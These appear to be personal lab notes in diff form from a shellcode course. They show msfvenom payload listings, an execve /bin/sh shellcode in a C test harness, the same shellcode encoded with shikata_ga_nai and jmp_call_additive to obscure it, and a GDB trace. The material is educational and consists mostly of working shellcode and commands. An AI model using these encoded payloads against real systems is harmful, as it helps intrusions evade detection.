@@ -1,0 +1,380 @@
+Using Metasploit's Encoder
+
+1.) Listing all the payloads 
+https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode
+kan1shka9@dev:~/Desktop/Remain/29$ sudo msfvenom -l payloads | grep "linux/x86"
+    linux/x86/adduser                                   Create a new user with UID 0
+    linux/x86/chmod                                     Runs chmod on specified file with specified mode
+    linux/x86/exec                                      Execute an arbitrary command
+    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the meterpreter server payload (staged). Listen for an IPv6 connection (Linux x86)
+    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the meterpreter server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
+    linux/x86/meterpreter/bind_nonx_tcp                 Inject the meterpreter server payload (staged). Listen for a connection
+    linux/x86/meterpreter/bind_tcp                      Inject the meterpreter server payload (staged). Listen for a connection (Linux x86)
+    linux/x86/meterpreter/bind_tcp_uuid                 Inject the meterpreter server payload (staged). Listen for a connection with UUID Support (Linux x86)
+    linux/x86/meterpreter/find_tag                      Inject the meterpreter server payload (staged). Use an established connection
+    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the meterpreter server payload (staged). Connect back to attacker over IPv6
+    linux/x86/meterpreter/reverse_nonx_tcp              Inject the meterpreter server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter/reverse_tcp                   Inject the meterpreter server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter/reverse_tcp_uuid              Inject the meterpreter server payload (staged). Connect back to the attacker
+    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service
+    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
+    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
+    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
+    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
+    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection
+    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)
+    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
+    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection
+    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
+    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
+    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
+    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
+    linux/x86/shell_find_port                           Spawn a shell on an established connection
+    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
+    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    linux/x86/shell_reverse_tcp2                        Connect back to attacker and spawn a command shell
+	
+2.) Assemble and execute
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh.nasm
+kan1shka9@dev:~/Desktop/Remain/29$ ./compile_ld.sh execve-stack-sh
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o
+kan1shka9@dev:~/Desktop/Remain/29$ objdump -d ./execve-stack-sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+kan1shka9@dev:~/Desktop/Remain/29$ cp ../28/shellcode.c .
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/29$ nano shellcode.c
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/29$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/29$ ./shellcode
+Shellcode length: 25
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:00 bash
+ 4183 pts/9    00:00:00 sh
+ 4187 pts/9    00:00:00 ps
+$ exit
+
+3.) Encode the shellcode
+kan1shka9@dev:~/Desktop/Remain/29$ sudo msfvenom -l encoders
+
+Framework Encoders
+==================
+
+    Name                          Rank       Description
+    ----                          ----       -----------
+    cmd/echo                      good       Echo Command Encoder
+    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
+    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
+    cmd/perl                      normal     Perl Command Encoder
+    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
+    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
+    generic/eicar                 manual     The EICAR Encoder
+    generic/none                  normal     The "none" Encoder
+    mipsbe/byte_xori              normal     Byte XORi Encoder
+    mipsbe/longxor                normal     XOR Encoder
+    mipsle/byte_xori              normal     Byte XORi Encoder
+    mipsle/longxor                normal     XOR Encoder
+    php/base64                    great      PHP Base64 Encoder
+    ppc/longxor                   normal     PPC LongXOR Encoder
+    ppc/longxor_tag               normal     PPC LongXOR Encoder
+    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
+    x64/xor                       normal     XOR Encoder
+    x86/add_sub                   manual     Add/Sub Encoder
+    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
+    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
+    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
+    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
+    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
+    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
+    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
+    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
+    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
+    x86/countdown                 normal     Single-byte XOR Countdown Encoder
+    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
+    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
+    x86/nonalpha                  low        Non-Alpha Encoder
+    x86/nonupper                  low        Non-Upper Encoder
+    x86/opt_sub                   manual     Sub Encoder (optimised)
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+    x86/single_static_bit         manual     Single Static Bit
+    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
+    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
+kan1shka9@dev:~/Desktop/Remain/29$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | sudo msfvenom --arch x86 --platform lin -f c -e x86/jmp_call_additive
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/jmp_call_additive
+x86/jmp_call_additive succeeded with size 57 (iteration=0)
+x86/jmp_call_additive chosen with final size 57
+Payload size: 57 bytes
+unsigned char buf[] =
+"\xfc\xbb\x78\xe7\x6f\xc6\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
+"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x49\x27\x3f\xae\x86"
+"\x88\xb3\x46\xb0\xf9\x51\xfe\x2e\x8f\x75\x50\x27\x6d\x2a\xd8"
+"\xd6\xc2\xc6\x17\x98\x23\xd9\xa7\x98\x23\xd9\xa7";
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/29$ cp shellcode.c shellcode-jmp_call_additive.c
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c  shellcode-jmp_call_additive.c
+kan1shka9@dev:~/Desktop/Remain/29$ nano shellcode-jmp_call_additive.c
+kan1shka9@dev:~/Desktop/Remain/29$ cat -n shellcode-jmp_call_additive.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\xfc\xbb\x78\xe7\x6f\xc6\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
+     6  "\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x49\x27\x3f\xae\x86"
+     7  "\x88\xb3\x46\xb0\xf9\x51\xfe\x2e\x8f\x75\x50\x27\x6d\x2a\xd8"
+     8  "\xd6\xc2\xc6\x17\x98\x23\xd9\xa7\x98\x23\xd9\xa7";
+     9
+    10  main()
+    11  {
+    12
+    13      printf("Shellcode length: %d\n", strlen(code));
+    14
+    15      int (*ret)() = (int(*)())code;
+    16
+    17      ret();
+    18
+    19  }
+kan1shka9@dev:~/Desktop/Remain/29$ gcc -fno-stack-protector -z execstack shellcode-jmp_call_additive.c -o shellcode-jmp_call_additive
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c  shellcode-jmp_call_additive  shellcode-jmp_call_additive.c
+kan1shka9@dev:~/Desktop/Remain/29$ ./shellcode-jmp_call_additive
+Shellcode length: 57
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:02 bash
+ 4655 pts/9    00:00:00 sh
+ 4656 pts/9    00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/29$
+
+4.) Using a different encoder
+kan1shka9@dev:~/Desktop/Remain/29$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | sudo msfvenom --arch x86 --platform lin -f c -e x86/shikata_ga_nai
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 52 (iteration=0)
+x86/shikata_ga_nai chosen with final size 52
+Payload size: 52 bytes
+unsigned char buf[] =
+"\xbe\x74\x73\x11\x95\xda\xd0\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
+"\x07\x83\xea\xfc\x31\x72\x0f\x03\x72\x7b\x91\xe4\xa4\x43\x05"
+"\x6f\xe8\x6c\xd5\x07\x9e\x5d\x7b\xb1\x30\x28\x98\x11\x44\xc8"
+"\x0c\x1b\xb7\xbc\xb8\xd6\xb8";
+Raise the number of iterations to 10
+kan1shka9@dev:~/Desktop/Remain/29$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | sudo msfvenom --arch x86 --platform lin -f c -e x86/shikata_ga_nai -i 10
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 52 (iteration=0)
+x86/shikata_ga_nai succeeded with size 79 (iteration=1)
+x86/shikata_ga_nai succeeded with size 106 (iteration=2)
+x86/shikata_ga_nai succeeded with size 133 (iteration=3)
+x86/shikata_ga_nai succeeded with size 160 (iteration=4)
+x86/shikata_ga_nai succeeded with size 187 (iteration=5)
+x86/shikata_ga_nai succeeded with size 214 (iteration=6)
+x86/shikata_ga_nai succeeded with size 241 (iteration=7)
+x86/shikata_ga_nai succeeded with size 268 (iteration=8)
+x86/shikata_ga_nai succeeded with size 295 (iteration=9)
+x86/shikata_ga_nai chosen with final size 295
+Payload size: 295 bytes
+unsigned char buf[] =
+"\xd9\xeb\xd9\x74\x24\xf4\xbe\x06\x2b\xe8\xcd\x5d\x33\xc9\xb1"
+"\x44\x31\x75\x17\x03\x75\x17\x83\xc3\x2f\x0a\x38\x12\xff\x13"
+"\xb7\x80\xf4\x1f\x30\x07\x91\x84\x19\xbc\x93\x8a\xa7\xf3\x7b"
+"\xf5\xd4\xab\x63\x86\x33\xbf\xb9\x18\xa3\xac\x64\x0a\x28\x92"
+"\x72\x56\x76\x40\xd4\x8c\xf8\x37\xfc\x23\xe5\x8e\x5d\xaf\xbe"
+"\x59\x83\x36\x9e\x3d\x3d\xc0\x3b\x1c\xb4\x78\xc8\xa3\x57\x25"
+"\x7f\x0c\x8a\x79\xca\xf6\xfa\x51\x96\x83\xb2\x66\x9a\x1e\x84"
+"\xbe\xe0\xb5\x59\xff\x6c\x96\xac\x4d\xf0\xe6\x32\xc3\x49\xc4"
+"\x64\x8f\x49\x7c\x02\x71\x02\xd5\x22\x15\x4b\x00\x66\xdf\xfa"
+"\x42\x41\x0d\xd9\x50\xb2\xbd\x9e\x77\x00\xe2\xa2\x0d\x34\xb0"
+"\x29\xb8\x87\xbe\xb6\x14\x43\x59\x42\xa3\x16\x6e\xaa\xbe\x13"
+"\xb1\x16\xca\x62\xb2\x3f\xb0\x26\xea\xca\xd0\x2a\x5c\x10\xff"
+"\x13\xb0\xf1\xff\xeb\x8b\x9c\xc2\xd9\x24\x57\xf2\xfc\xb1\xd4"
+"\x11\xde\xc4\xcc\xe5\x47\x19\xb2\x85\xc4\x89\xc9\xf7\x69\x25"
+"\x5e\x8c\x75\xd3\x63\x44\x2b\x53\x56\xd5\x8c\xcd\x94\x71\x5c"
+"\x17\xb2\x7e\xe5\x9d\x5e\x23\xae\x31\xdb\x00\x12\x93\xff\xed"
+"\xd9\x15\xc7\xf8\x9a\x7a\x6b\xdc\x20\x17\xcd\x2b\x13\x2c\x82"
+"\x58\x8a\x5c\x8b\x84\x64\xd3\xc9\x8a\x7a\xe5\xcd\x07\xde\x89"
+"\x57\x80\x04\x8a\xad\x58\x45\xfe\x1a\x52\x08\x26\xec\x1a\xa4"
+"\x09\x17\x86\xb3\x38\x63\x4b\x65\x36\x0c";
+kan1shka9@dev:~/Desktop/Remain/29$
+kan1shka9@dev:~/Desktop/Remain/29$ cp shellcode.c shellcode-shikata_ga_nai.c
+kan1shka9@dev:~/Desktop/Remain/29$ nano shellcode-shikata_ga_nai.c
+kan1shka9@dev:~/Desktop/Remain/29$ cat -n shellcode-shikata_ga_nai.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\xd9\xeb\xd9\x74\x24\xf4\xbe\x06\x2b\xe8\xcd\x5d\x33\xc9\xb1"
+     6  "\x44\x31\x75\x17\x03\x75\x17\x83\xc3\x2f\x0a\x38\x12\xff\x13"
+     7  "\xb7\x80\xf4\x1f\x30\x07\x91\x84\x19\xbc\x93\x8a\xa7\xf3\x7b"
+     8  "\xf5\xd4\xab\x63\x86\x33\xbf\xb9\x18\xa3\xac\x64\x0a\x28\x92"
+     9  "\x72\x56\x76\x40\xd4\x8c\xf8\x37\xfc\x23\xe5\x8e\x5d\xaf\xbe"
+    10  "\x59\x83\x36\x9e\x3d\x3d\xc0\x3b\x1c\xb4\x78\xc8\xa3\x57\x25"
+    11  "\x7f\x0c\x8a\x79\xca\xf6\xfa\x51\x96\x83\xb2\x66\x9a\x1e\x84"
+    12  "\xbe\xe0\xb5\x59\xff\x6c\x96\xac\x4d\xf0\xe6\x32\xc3\x49\xc4"
+    13  "\x64\x8f\x49\x7c\x02\x71\x02\xd5\x22\x15\x4b\x00\x66\xdf\xfa"
+    14  "\x42\x41\x0d\xd9\x50\xb2\xbd\x9e\x77\x00\xe2\xa2\x0d\x34\xb0"
+    15  "\x29\xb8\x87\xbe\xb6\x14\x43\x59\x42\xa3\x16\x6e\xaa\xbe\x13"
+    16  "\xb1\x16\xca\x62\xb2\x3f\xb0\x26\xea\xca\xd0\x2a\x5c\x10\xff"
+    17  "\x13\xb0\xf1\xff\xeb\x8b\x9c\xc2\xd9\x24\x57\xf2\xfc\xb1\xd4"
+    18  "\x11\xde\xc4\xcc\xe5\x47\x19\xb2\x85\xc4\x89\xc9\xf7\x69\x25"
+    19  "\x5e\x8c\x75\xd3\x63\x44\x2b\x53\x56\xd5\x8c\xcd\x94\x71\x5c"
+    20  "\x17\xb2\x7e\xe5\x9d\x5e\x23\xae\x31\xdb\x00\x12\x93\xff\xed"
+    21  "\xd9\x15\xc7\xf8\x9a\x7a\x6b\xdc\x20\x17\xcd\x2b\x13\x2c\x82"
+    22  "\x58\x8a\x5c\x8b\x84\x64\xd3\xc9\x8a\x7a\xe5\xcd\x07\xde\x89"
+    23  "\x57\x80\x04\x8a\xad\x58\x45\xfe\x1a\x52\x08\x26\xec\x1a\xa4"
+    24  "\x09\x17\x86\xb3\x38\x63\x4b\x65\x36\x0c";
+    25
+    26  main()
+    27  {
+    28
+    29      printf("Shellcode length: %d\n", strlen(code));
+    30
+    31      int (*ret)() = (int(*)())code;
+    32
+    33      ret();
+    34
+    35  }
+kan1shka9@dev:~/Desktop/Remain/29$ gcc -fno-stack-protector -z execstack shellcode-shikata_ga_nai.c -o shellcode-shikata_ga_nai
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c  shellcode-jmp_call_additive  shellcode-jmp_call_additive.c  shellcode-shikata_ga_nai  shellcode-shikata_ga_nai.c
+kan1shka9@dev:~/Desktop/Remain/29$ ./shellcode-shikata_ga_nai
+Shellcode length: 131
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:02 bash
+ 4777 pts/9    00:00:00 sh
+ 4778 pts/9    00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/29$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | sudo msfvenom --arch x86 --platform lin -f elf -e x86/shikata_ga_nai -i 10 > demo
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 52 (iteration=0)
+x86/shikata_ga_nai succeeded with size 79 (iteration=1)
+x86/shikata_ga_nai succeeded with size 106 (iteration=2)
+x86/shikata_ga_nai succeeded with size 133 (iteration=3)
+x86/shikata_ga_nai succeeded with size 160 (iteration=4)
+x86/shikata_ga_nai succeeded with size 187 (iteration=5)
+x86/shikata_ga_nai succeeded with size 214 (iteration=6)
+x86/shikata_ga_nai succeeded with size 241 (iteration=7)
+x86/shikata_ga_nai succeeded with size 268 (iteration=8)
+x86/shikata_ga_nai succeeded with size 295 (iteration=9)
+x86/shikata_ga_nai chosen with final size 295
+Payload size: 295 bytes
+
+kan1shka9@dev:~/Desktop/Remain/29$ ls
+compile_ld.sh  demo  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c  shellcode-jmp_call_additive  shellcode-jmp_call_additive.c  shellcode-shikata_ga_nai  shellcode-shikata_ga_nai.c
+kan1shka9@dev:~/Desktop/Remain/29$ file demo
+demo: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size
+kan1shka9@dev:~/Desktop/Remain/29$ chmod a+x demo
+kan1shka9@dev:~/Desktop/Remain/29$ ./demo
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:02 bash
+ 4843 pts/9    00:00:00 sh
+ 4844 pts/9    00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/29$
+
+5.) Single step in GDB
+kan1shka9@dev:~/Desktop/Remain/29$ gdb -q ./shellcode-shikata_ga_nai
+Reading symbols from ./shellcode-shikata_ga_nai...(no debugging symbols found)...done.
+(gdb) break *&code
+Breakpoint 1 at 0x804a040
+(gdb) set disassembly-flavor intel
+(gdb) run
+Starting program: /home/kan1shka9/Desktop/Remain/29/shellcode-shikata_ga_nai
+Shellcode length: 131
+
+Breakpoint 1, 0x0804a040 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     fldpi
+   0x0804a042 <+2>:     fnstenv [esp-0xc]
+   0x0804a046 <+6>:     mov    esi,0xcde82b06
+   0x0804a04b <+11>:    pop    ebp
+   0x0804a04c <+12>:    xor    ecx,ecx
+   0x0804a04e <+14>:    mov    cl,0x44
+   0x0804a050 <+16>:    xor    DWORD PTR [ebp+0x17],esi
+   0x0804a053 <+19>:    add    esi,DWORD PTR [ebp+0x17]
+   0x0804a056 <+22>:    add    ebx,0x2f
+   0x0804a059 <+25>:    or     bh,BYTE PTR [eax]
+   0x0804a05b <+27>:    adc    bh,bh
+   0x0804a05d <+29>:    adc    esi,DWORD PTR [edi+0x301ff480]
+   0x0804a063 <+35>:    pop    es
+   0x0804a064 <+36>:    xchg   ecx,eax
+   0x0804a065 <+37>:    test   BYTE PTR [ecx],bl
+   0x0804a067 <+39>:    mov    esp,0xf3a78a93
+   0x0804a06c <+44>:    jnp    0x804a063 <code+35>
+   0x0804a06e <+46>:    aam    0xab
+   0x0804a070 <+48>:    arpl   WORD PTR [esi+0x18b9bf33],ax
+   0x0804a076 <+54>:    mov    ds:0x280a64ac,eax
+   0x0804a07b <+59>:    xchg   edx,eax
+   0x0804a07c <+60>:    jb     0x804a0d4 <code+148>
+   0x0804a07e <+62>:    jbe    0x804a0c0 <code+128>
+   0x0804a080 <+64>:    aam    0x8c
+   0x0804a082 <+66>:    clc
+   0x0804a083 <+67>:    aaa
+   0x0804a084 <+68>:    cld
+   0x0804a085 <+69>:    and    esp,ebp
+   0x0804a087 <+71>:    mov    ds,WORD PTR [ebp-0x51]
+   0x0804a08a <+74>:    mov    esi,0x9e368359
+   0x0804a08f <+79>:    cmp    eax,0x1c3bc03d
+   0x0804a094 <+84>:    mov    ah,0x78
+   0x0804a096 <+86>:    enter  0x57a3,0x25
+   0x0804a09a <+90>:    jg     0x804a0a8 <code+104>
+   0x0804a09c <+92>:    mov    bh,BYTE PTR [ecx-0x36]
+   0x0804a09f <+95>:    idiv   dl
+   0x0804a0a1 <+97>:    push   ecx
+   0x0804a0a2 <+98>:    xchg   esi,eax
+   0x0804a0a3 <+99>:    xor    DWORD PTR [edx-0x7be1659a],0xffffffbe
+   0x0804a0aa <+106>:   loopne 0x804a061 <code+33>
+   0x0804a0ac <+108>:   pop    ecx
+   0x0804a0ad <+109>:   jmp    FWORD PTR [esi+edx*4-0x54]
+   0x0804a0b1 <+113>:   dec    ebp
+   0x0804a0b2 <+114>:   lock out 0x32,al
+   0x0804a0b5 <+117>:   ret
+   0x0804a0b6 <+118>:   dec    ecx
+   0x0804a0b7 <+119>:   les    esp,FWORD PTR [edi+ecx*4+0x49]
+   0x0804a0bb <+123>:   jl     0x804a0bf <code+127>
+   0x0804a0bd <+125>:   jno    0x804a0c1 <code+129>
+   0x0804a0bf <+127>:   aad    0x22
+   0x0804a0c1 <+129>:   adc    eax,0xdf66004b
+   0x0804a0c6 <+134>:   cli
+   0x0804a0c7 <+135>:   inc    edx
+   0x0804a0c8 <+136>:   inc    ecx
+   0x0804a0c9 <+137>:   or     eax,0xbdb250d9
+   0x0804a0ce <+142>:   sahf
+   0x0804a0cf <+143>:   ja     0x804a0d1 <code+145>
+   0x0804a0d1 <+145>:   loop   0x804a075 <code+53>
+   0x0804a0d3 <+147>:   or     eax,0xb829b034
+   0x0804a0d8 <+152>:   xchg   DWORD PTR [esi+0x594314b6],edi
+   0x0804a0de <+158>:   inc    edx
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 4911] will be killed.
+
+Quit anyway? (y or n) y
+kan1shka9@dev:~/Desktop/Remain/29$
+There are 10 iterations so very difficult to follow along.
